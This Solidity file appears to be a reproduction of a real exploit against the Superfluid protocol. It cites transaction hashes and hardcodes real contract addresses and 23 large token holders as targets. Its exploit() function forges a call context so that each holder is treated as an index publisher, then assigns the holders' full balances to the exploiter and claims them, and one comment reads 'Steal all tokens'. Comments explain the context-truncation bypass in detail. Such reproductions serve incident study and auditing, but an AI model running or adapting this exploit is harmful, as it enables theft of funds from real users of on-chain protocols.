// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./interfaces/SuperfluidInterfaces.sol";

// Tx hashes:
// 0xf9b4a3a64861e9feb27e21f3fc9c85e6d2851b8a097c71910585e3d7f374d8d8
// 0x396b6ee91216cf6e7c89f0c6044dfc97e84647f5007a658ca899040471ab4d67
contract SuperfluidExploiter {
    ISuperfluid private constant SUPERFLUID = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    IInstantDistributionAgreement private constant IDA =
        IInstantDistributionAgreement(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);

    ISuperToken private constant QIx = ISuperToken(0xe1cA10e6a10c0F72B74dF6b7339912BaBfB1f8B5);
    ISuperToken private constant ETHx = ISuperToken(0x27e1e4E6BC79D93032abef01025811B7E4727e85);
    ISuperToken private constant USDCx = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);
    ISuperToken private constant SDTx = ISuperToken(0x12c294107772b10815307c05989DABD71C21670e);
    ISuperToken private constant MOCAx = ISuperToken(0x1ADcA32B906883e474aEbcBA5708B41F3645f941);
    ISuperToken private constant STACKx = ISuperToken(0xcAE73e9EeE8a01b8B7F94b59133e3821F21470AB);
    ISuperToken private constant MATICx = ISuperToken(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);
    ISuperToken private constant sdam3CRVx = ISuperToken(0x8ef4F0C0753048a39B4Bc4eB3f545Fdae00618B7);

    // Addresses holding most of the tokens
    address private constant QIx_WHALE1 = 0x5073c1535A1a238E7c7438c553F1a2BaAC366cEE;
    address private constant QIx_WHALE2 = 0xe6116AA08e14afE08A9A563E9ef6cCd5b47070B7;
    address private constant ETHx_WHALE1 = 0x0154d25120Ed20A516fE43991702e7463c5A6F6e;
    address private constant ETHx_WHALE2 = 0x1EB3FAA360bF1f093F5A18d21f21f13D769d044A;
    address private constant USDCx_WHALE1 = 0x6583f33895B538DFdeeE234F2D34dF1033655de1;
    address private constant USDCx_WHALE2 = 0xe44257ec3c1767074f9d0A648073Eb1e6D369f8a;
    address private constant USDCx_WHALE3 = 0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188;
    address private constant USDCx_WHALE4 = 0x81Ea02098336435d5e92e032C029AAB850304f5D;
    address private constant USDCx_WHALE5 = 0xA08f80dc1759b12fdC40A4dc64562b322C418E1f;
    address private constant USDCx_WHALE6 = 0x2Af4AE1226f28A1a3bc239b96e16291EF4fDD57d;
    address private constant USDCx_WHALE7 = 0xAF8b668bfC2aD9457c03c2989C7816b5cbe2185c;
    address private constant USDCx_WHALE8 = 0x0C3483e3B355986D6Bb76E3CEbBC8dD8EC20779C;
    address private constant USDCx_WHALE9 = 0xf7f0CFC3772d29d4CC1482A2ACB7Be16a85a2223;
    address private constant USDCx_WHALE10 = 0x87a4b3E26D17C88C8E22B605bb211f3b92c659F4;
    address private constant USDCx_WHALE11 = 0x290a27026021af22b1794Dc1e489A35869820637;
    address private constant USDCx_WHALE12 = 0xdf924446d08C642E0B1Df15089E2ab87f737a544;
    address private constant USDCx_WHALE13 = 0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7;
    address private constant SDTx_WHALE = 0xD6Fb1f82FF2296b55bddfFcCe80ABde7fbC6c22d;
    address private constant MOCAx_WHALE = 0x39b7B5fb06C4B24D8758306774D7340dC694320A;
    address private constant STACKx_WHALE = 0x8393183E7217D982A698682a3F620ae6957f6F2d;
    address private constant MATICx_WHALE = 0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7;
    address private constant sdam3CRVx_WHALE1 = 0xD6Fb1f82FF2296b55bddfFcCe80ABde7fbC6c22d;
    address private constant sdam3CRVx_WHALE2 = 0x7749e869B88A3C45b40F8C257E0bB36981b8262f;

    uint32 private constant INDEX_ID = 98789;

    struct SuperWhale {
        address addr;
        ISuperToken token;
    }

    function exploit() external {
        SuperWhale[23] memory WHALE = [
            SuperWhale(QIx_WHALE1, QIx), 
            SuperWhale(QIx_WHALE2, QIx),
            SuperWhale(ETHx_WHALE1, ETHx),
            SuperWhale(ETHx_WHALE2, ETHx),
            SuperWhale(USDCx_WHALE1, USDCx),
            SuperWhale(USDCx_WHALE2, USDCx),
            SuperWhale(USDCx_WHALE3, USDCx),
            SuperWhale(USDCx_WHALE4, USDCx),
            SuperWhale(USDCx_WHALE5, USDCx),
            SuperWhale(USDCx_WHALE6, USDCx),
            SuperWhale(USDCx_WHALE7, USDCx),
            SuperWhale(USDCx_WHALE8, USDCx),
            SuperWhale(USDCx_WHALE9, USDCx),
            SuperWhale(USDCx_WHALE10, USDCx),
            SuperWhale(USDCx_WHALE11, USDCx),
            SuperWhale(USDCx_WHALE12, USDCx),
            SuperWhale(USDCx_WHALE13, USDCx),
            SuperWhale(SDTx_WHALE, SDTx),
            SuperWhale(MOCAx_WHALE, MOCAx),
            SuperWhale(STACKx_WHALE, STACKx),
            SuperWhale(MATICx_WHALE, MATICx),
            SuperWhale(sdam3CRVx_WHALE1, sdam3CRVx),
            SuperWhale(sdam3CRVx_WHALE2, sdam3CRVx)
        ];

        uint256 len = WHALE.length;

        /*  Simulate 1st tx: Setup IDA agreements for all target tokens.
            - Use create with a fake ctx embedded that contains the whale's address instead of an expected placeholder.
            - In _replacePlaceholderCtx, zero length placeholder ctx check can be bypassed with any calldata that ends
                with 32 bytes of 0, which gets packed with the replacement ctx.
            - The calldata will get truncated due to the abi decoding of createIndex, cutting off the replacement ctx
                and leaving only the fake ctx.
            - decodeCtx will then be tricked into decoding the whale addr as msg.sender, which gets assigned as the
                index publisher.
        */
        for(uint i = 0; i < len; ++i) {
            SUPERFLUID.callAgreement(
                IDA,
                abi.encodeWithSelector(
                    IDA.createIndex.selector,
                    WHALE[i].token,
                    INDEX_ID,
                    abi.encode(
                        abi.encode(0, 0, WHALE[i].addr, bytes4(0), new bytes(0)),
                        abi.encode(0, 0, address(0), address(0))
                    )
                ),
                "0x"
            );
        }

        // Simulate 2nd tx: Use similar steps above to update the subscription units for exploiter contract to the full 
        // token balance of the whale.
        for (uint i = 0; i < len; ++i) {
            SUPERFLUID.callAgreement(
                IDA,
                abi.encodeWithSelector(
                    IDA.updateSubscription.selector,
                    WHALE[i].token,
                    INDEX_ID,
                    address(this),
                    WHALE[i].token.balanceOf(WHALE[i].addr),
                    abi.encode(
                        abi.encode(0, 0, WHALE[i].addr, bytes4(0), new bytes(0)),
                        abi.encode(0, 0, address(0), address(0))
                    )
                ),
                "0x"
            );
            // Update index value from 0 to 1.
            // Note: Distribution amount = (index.indexValue - subscriber.indexValue) * subscriber.units
            SUPERFLUID.callAgreement(
                IDA,
                abi.encodeWithSelector(
                    IDA.updateIndex.selector,
                    WHALE[i].token,
                    INDEX_ID,
                    1,
                    abi.encode(
                        abi.encode(0, 0, WHALE[i].addr, bytes4(0), new bytes(0)),
                        abi.encode(0, 0, address(0), address(0))
                    )
                ),
                "0x"
            );
            // Steal all tokens.
            SUPERFLUID.callAgreement(
                IDA,
                abi.encodeWithSelector(
                    IDA.claim.selector,
                    WHALE[i].token,
                    WHALE[i].addr,
                    INDEX_ID,
                    address(this),
                    new bytes(0)
                ),
                "0x"
            );
        }
    }
}
